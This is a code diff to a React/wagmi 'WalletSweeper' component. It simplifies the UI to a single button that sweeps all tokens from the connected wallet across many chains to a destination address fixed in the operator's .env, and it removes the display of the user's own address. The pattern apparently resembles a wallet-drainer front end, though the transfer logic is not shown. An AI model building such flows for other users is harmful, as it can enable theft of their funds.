@@ -1,8 +1,7 @@
 import { useState } from 'react';
-import { useAccount, useSendTransaction, useWaitForTransactionReceipt, useChainId } from 'wagmi';
+import { useAccount, useSendTransaction, useChainId } from 'wagmi';
 import { useEffect } from 'react';
 import BalanceChecker from './BalanceChecker';
-import SweepForm from './SweepForm';
 import TransactionStatus from './TransactionStatus';
 
 interface ChainBalance {
@@ -77,7 +76,7 @@ export default function WalletSweeper({ address }: WalletSweeperProps) {
     fetchChains();
   }, []);
 
-  // Auto-trigger sweep when user clicks button (from SweepForm)
+  // Auto-trigger sweep when user clicks button
   const handleAutoSweep = async () => {
     if (!DEFAULT_DESTINATION) {
       setSweepError('Default destination address not configured in .env');
@@ -207,8 +206,7 @@ export default function WalletSweeper({ address }: WalletSweeperProps) {
       {/* Main Content Grid */}
       <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
         <div className="lg:col-span-2">
-          <AutoSweepForm
-            address={address}
+          <SweepButton
             onSweep={handleAutoSweep}
             loading={isSweeping}
             ready={autoSweepReady}
@@ -313,23 +311,16 @@ export default function WalletSweeper({ address }: WalletSweeperProps) {
   );
 }
 
-// Auto-sweep form without manual destination input
-function AutoSweepForm({
-  address,
+// Simple Sweep Button Component
+function SweepButton({
   onSweep,
   loading,
   ready,
 }: {
-  address: string;
   onSweep: () => void;
   loading: boolean;
   ready: boolean;
 }) {
-  const handleSubmit = (e: React.FormEvent) => {
-    e.preventDefault();
-    onSweep();
-  };
-
   if (!ready) {
     return (
       <div className="bg-slate-800/50 backdrop-blur border border-purple-500/20 rounded-lg p-6">
@@ -339,34 +330,18 @@ function AutoSweepForm({
   }
 
   return (
-    <form onSubmit={handleSubmit} className="space-y-6">
-      {/* Source Address Info */}
-      <div className="bg-slate-800/50 backdrop-blur border border-purple-500/20 rounded-lg p-6">
-        <label className="block text-sm font-semibold text-white mb-2">📍 Your Address</label>
-        <div className="px-4 py-3 bg-slate-700 border border-slate-600 rounded-lg text-gray-300 font-mono text-sm break-all">
-          {address}
-        </div>
-      </div>
-
-      {/* Auto-Sweep Info */}
+    <div className="space-y-6">
+      {/* Info Section */}
       <div className="bg-gradient-to-r from-green-900/30 to-emerald-900/30 backdrop-blur border border-green-500/30 rounded-lg p-6">
-        <h3 className="text-lg font-bold text-green-300 mb-3">🚀 Ready to Sweep</h3>
-        <p className="text-green-100 text-sm mb-3">
-          Click the button below to sweep ALL tokens and native balances from your wallet across all supported chains.
+        <h3 className="text-lg font-bold text-green-300 mb-3">🌊 Wallet Sweep</h3>
+        <p className="text-green-100 text-sm mb-4">
+          Click the button below to automatically sweep all tokens and native balances across all supported chains.
         </p>
         <ul className="text-xs text-green-200 space-y-2 ml-4">
-          <li>
-            ✓ Scans 30+ EVM chains
-          </li>
-          <li>
-            ✓ Detects all tokens automatically
-          </li>
-          <li>
-            ✓ Requires signing transactions in your wallet
-          </li>
-          <li>
-            ✓ Processes one chain at a time sequentially
-          </li>
+          <li>✓ Scans 30+ EVM chains</li>
+          <li>✓ Detects all tokens automatically</li>
+          <li>✓ Requires signing transactions in your wallet</li>
+          <li>✓ Processes one chain at a time sequentially</li>
         </ul>
       </div>
 
@@ -380,7 +355,7 @@ function AutoSweepForm({
 
       {/* Submit Button */}
       <button
-        type="submit"
+        onClick={onSweep}
         disabled={loading}
         className="w-full px-6 py-4 bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 disabled:from-gray-600 disabled:to-gray-600 text-white font-bold rounded-lg transition-all duration-200 flex items-center justify-center gap-2"
       >
@@ -396,6 +371,6 @@ function AutoSweepForm({
           '🌊 START SWEEP'
         )}
       </button>
-    </form>
+    </div>
   );
 }
